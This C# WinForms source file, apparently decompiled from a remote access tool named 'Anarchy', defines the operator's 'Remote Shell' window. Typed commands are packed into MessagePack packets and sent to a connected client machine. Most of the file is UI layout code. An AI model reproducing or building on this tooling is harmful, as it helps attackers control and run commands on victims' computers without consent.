using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;
using Guna.UI2.WinForms;
using Siticone.UI.WinForms;

namespace Anarchy.Forms;

public class FormShell : Form
{
    private IContainer components;

    private TextBox textBox1;

    public RichTextBox richTextBox1;

    public System.Windows.Forms.Timer timer1;

    private Guna2Panel guna2Panel2;

    private SiticoneControlBox siticoneControlBox4;

    private SiticoneControlBox siticoneControlBox3;

    internal Label Label22;

    private Guna2DragControl guna2DragControl1;

    private Guna2CircleProgressBar guna2CircleProgressBar1;

    private System.Windows.Forms.Timer timer2;

    private Label label2;

    private Guna2VScrollBar guna2VScrollBar1;

    private Guna2BorderlessForm guna2BorderlessForm1;

    public Form1 F { get; set; }

    internal Clients Client { get; set; }

    [DllImport("Gdi32.dll")]
    private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int RightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

    public FormShell()
    {
        this.InitializeComponent();
        this.guna2CircleProgressBar1.Value = 0;
        base.Region = Region.FromHrgn(FormShell.CreateRoundRectRgn(0, 0, base.Width, base.Height, 25, 25));
    }

    private void TextBox1_KeyDown(object sender, KeyEventArgs e)
    {
        if (this.Client != null && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.textBox1.Text))
        {
            if (this.textBox1.Text == "cls".ToLower())
            {
                this.richTextBox1.Clear();
                this.textBox1.Clear();
            }
            if (this.textBox1.Text == "exit".ToLower())
            {
                base.Close();
            }
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
            msgPack.ForcePathObject("WriteInput").AsString = this.textBox1.Text;
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
            this.textBox1.Clear();
        }
    }

    private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
        msgPack.ForcePathObject("WriteInput").AsString = "exit";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!this.Client.TcpClient.Connected)
            {
                base.Close();
            }
        }
        catch
        {
            base.Close();
        }
    }

    private void hopeForm1_Click(object sender, EventArgs e)
    {
    }

    private void textBox1_MouseMove(object sender, MouseEventArgs e)
    {
    }

    private void timer2_Tick(object sender, EventArgs e)
    {
        this.guna2CircleProgressBar1.Value++;
        this.guna2CircleProgressBar1.Text = this.guna2CircleProgressBar1.Value + "%";
        if (this.guna2CircleProgressBar1.Value == 100)
        {
            this.timer1.Enabled = false;
            this.textBox1.Enabled = true;
            this.guna2CircleProgressBar1.Visible = false;
            this.label2.Visible = false;
        }
    }

    private void textBox1_MouseDown(object sender, MouseEventArgs e)
    {
        this.textBox1.Clear();
    }

    private void siticoneControlBox3_Click(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormShell));
        this.richTextBox1 = new System.Windows.Forms.RichTextBox();
        this.textBox1 = new System.Windows.Forms.TextBox();
        this.timer1 = new System.Windows.Forms.Timer(this.components);
        this.guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
        this.siticoneControlBox4 = new Siticone.UI.WinForms.SiticoneControlBox();
        this.siticoneControlBox3 = new Siticone.UI.WinForms.SiticoneControlBox();
        this.Label22 = new System.Windows.Forms.Label();
        this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
        this.guna2CircleProgressBar1 = new Guna.UI2.WinForms.Guna2CircleProgressBar();
        this.timer2 = new System.Windows.Forms.Timer(this.components);
        this.label2 = new System.Windows.Forms.Label();
        this.guna2VScrollBar1 = new Guna.UI2.WinForms.Guna2VScrollBar();
        this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
        this.guna2Panel2.SuspendLayout();
        base.SuspendLayout();
        this.richTextBox1.BackColor = System.Drawing.Color.Black;
        this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.richTextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
        this.richTextBox1.Font = new System.Drawing.Font("Consolas", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.richTextBox1.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
        this.richTextBox1.Location = new System.Drawing.Point(0, 41);
        this.richTextBox1.Margin = new System.Windows.Forms.Padding(2);
        this.richTextBox1.Name = "richTextBox1";
        this.richTextBox1.ReadOnly = true;
        this.richTextBox1.Size = new System.Drawing.Size(758, 329);
        this.richTextBox1.TabIndex = 0;
        this.richTextBox1.Text = "";
        this.textBox1.BackColor = System.Drawing.Color.Black;
        this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
        this.textBox1.Dock = System.Windows.Forms.DockStyle.Bottom;
        this.textBox1.Enabled = false;
        this.textBox1.Font = new System.Drawing.Font("Consolas", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.textBox1.ForeColor = System.Drawing.Color.White;
        this.textBox1.Location = new System.Drawing.Point(0, 370);
        this.textBox1.Margin = new System.Windows.Forms.Padding(2);
        this.textBox1.Name = "textBox1";
        this.textBox1.Size = new System.Drawing.Size(758, 20);
        this.textBox1.TabIndex = 1;
        this.textBox1.Text = "command..";
        this.textBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(TextBox1_KeyDown);
        this.textBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(textBox1_MouseDown);
        this.textBox1.MouseMove += new System.Windows.Forms.MouseEventHandler(textBox1_MouseMove);
        this.timer1.Interval = 1000;
        this.timer1.Tick += new System.EventHandler(Timer1_Tick);
        this.guna2Panel2.BackColor = System.Drawing.Color.Transparent;
        this.guna2Panel2.Controls.Add(this.siticoneControlBox4);
        this.guna2Panel2.Controls.Add(this.siticoneControlBox3);
        this.guna2Panel2.Controls.Add(this.Label22);
        this.guna2Panel2.CustomBorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.guna2Panel2.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 1, 0);
        this.guna2Panel2.Dock = System.Windows.Forms.DockStyle.Top;
        this.guna2Panel2.Location = new System.Drawing.Point(0, 0);
        this.guna2Panel2.Name = "guna2Panel2";
        this.guna2Panel2.ShadowDecoration.Color = System.Drawing.Color.White;
        this.guna2Panel2.ShadowDecoration.Depth = 15;
        this.guna2Panel2.Size = new System.Drawing.Size(758, 41);
        this.guna2Panel2.TabIndex = 29;
        this.siticoneControlBox4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.siticoneControlBox4.BackColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox4.BorderRadius = 10;
        this.siticoneControlBox4.ControlBoxType = Siticone.UI.WinForms.Enums.ControlBoxType.MinimizeBox;
        this.siticoneControlBox4.FillColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox4.HoveredState.Parent = this.siticoneControlBox4;
        this.siticoneControlBox4.IconColor = System.Drawing.Color.White;
        this.siticoneControlBox4.Location = new System.Drawing.Point(659, 5);
        this.siticoneControlBox4.Name = "siticoneControlBox4";
        this.siticoneControlBox4.ShadowDecoration.Parent = this.siticoneControlBox4;
        this.siticoneControlBox4.Size = new System.Drawing.Size(45, 29);
        this.siticoneControlBox4.TabIndex = 21;
        this.siticoneControlBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.siticoneControlBox3.BackColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox3.BorderRadius = 10;
        this.siticoneControlBox3.FillColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox3.HoveredState.Parent = this.siticoneControlBox3;
        this.siticoneControlBox3.IconColor = System.Drawing.Color.White;
        this.siticoneControlBox3.Location = new System.Drawing.Point(710, 5);
        this.siticoneControlBox3.Name = "siticoneControlBox3";
        this.siticoneControlBox3.PressedColor = System.Drawing.Color.DarkRed;
        this.siticoneControlBox3.ShadowDecoration.Parent = this.siticoneControlBox3;
        this.siticoneControlBox3.Size = new System.Drawing.Size(45, 29);
        this.siticoneControlBox3.TabIndex = 20;
        this.siticoneControlBox3.Click += new System.EventHandler(siticoneControlBox3_Click);
        this.Label22.AutoSize = true;
        this.Label22.BackColor = System.Drawing.Color.Transparent;
        this.Label22.Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.Label22.ForeColor = System.Drawing.Color.White;
        this.Label22.Location = new System.Drawing.Point(6, 10);
        this.Label22.Name = "Label22";
        this.Label22.Size = new System.Drawing.Size(118, 21);
        this.Label22.TabIndex = 19;
        this.Label22.Text = "\\/ Remote Shell";
        this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
        this.guna2DragControl1.TargetControl = this.guna2Panel2;
        this.guna2DragControl1.UseTransparentDrag = true;
        this.guna2CircleProgressBar1.AllowDrop = true;
        this.guna2CircleProgressBar1.AnimationSpeed = 500f;
        this.guna2CircleProgressBar1.FillColor = System.Drawing.Color.FromArgb(28, 26, 43);
        this.guna2CircleProgressBar1.Font = new System.Drawing.Font("Segoe UI", 27.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.guna2CircleProgressBar1.ForeColor = System.Drawing.SystemColors.ButtonHighlight;
        this.guna2CircleProgressBar1.Location = new System.Drawing.Point(297, 114);
        this.guna2CircleProgressBar1.Minimum = 0;
        this.guna2CircleProgressBar1.Name = "guna2CircleProgressBar1";
        this.guna2CircleProgressBar1.ProgressBrushMode = Guna.UI2.WinForms.Enums.BrushMode.SolidTransition;
        this.guna2CircleProgressBar1.ProgressColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.guna2CircleProgressBar1.ProgressColor2 = System.Drawing.Color.MediumAquamarine;
        this.guna2CircleProgressBar1.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.guna2CircleProgressBar1.Size = new System.Drawing.Size(150, 150);
        this.guna2CircleProgressBar1.TabIndex = 30;
        this.guna2CircleProgressBar1.TextRenderingHint = System.Drawing.Text.TextRenderingHint.AntiAlias;
        this.guna2CircleProgressBar1.UseWaitCursor = true;
        this.guna2CircleProgressBar1.Value = 68;
        this.timer2.Enabled = true;
        this.timer2.Interval = 18;
        this.timer2.Tick += new System.EventHandler(timer2_Tick);
        this.label2.AutoSize = true;
        this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.label2.ForeColor = System.Drawing.Color.MistyRose;
        this.label2.Location = new System.Drawing.Point(319, 267);
        this.label2.Name = "label2";
        this.label2.Size = new System.Drawing.Size(107, 25);
        this.label2.TabIndex = 31;
        this.label2.Text = "Loading...";
        this.guna2VScrollBar1.BindingContainer = this.richTextBox1;
        this.guna2VScrollBar1.FillColor = System.Drawing.Color.Black;
        this.guna2VScrollBar1.InUpdate = false;
        this.guna2VScrollBar1.LargeChange = 10;
        this.guna2VScrollBar1.Location = new System.Drawing.Point(740, 41);
        this.guna2VScrollBar1.Name = "guna2VScrollBar1";
        this.guna2VScrollBar1.ScrollbarSize = 18;
        this.guna2VScrollBar1.Size = new System.Drawing.Size(18, 329);
        this.guna2VScrollBar1.TabIndex = 59;
        this.guna2VScrollBar1.ThumbColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.guna2VScrollBar1.ThumbStyle = Guna.UI2.WinForms.Enums.ThumbStyle.Inset;
        this.guna2BorderlessForm1.BorderRadius = 6;
        this.guna2BorderlessForm1.ContainerControl = this;
        this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
        this.guna2BorderlessForm1.ResizeForm = false;
        this.guna2BorderlessForm1.ShadowColor = System.Drawing.Color.DarkGreen;
        this.guna2BorderlessForm1.TransparentWhileDrag = true;
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Black;
        base.ClientSize = new System.Drawing.Size(758, 390);
        base.Controls.Add(this.guna2VScrollBar1);
        base.Controls.Add(this.label2);
        base.Controls.Add(this.guna2CircleProgressBar1);
        base.Controls.Add(this.richTextBox1);
        base.Controls.Add(this.guna2Panel2);
        base.Controls.Add(this.textBox1);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Margin = new System.Windows.Forms.Padding(2);
        base.MaximizeBox = false;
        this.MaximumSize = new System.Drawing.Size(1920, 1080);
        this.MinimumSize = new System.Drawing.Size(190, 40);
        base.Name = "FormShell";
        base.Opacity = 0.98;
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Remote Shell";
        base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormShell_FormClosed);
        this.guna2Panel2.ResumeLayout(false);
        this.guna2Panel2.PerformLayout();
        base.ResumeLayout(false);
        base.PerformLayout();
    }
}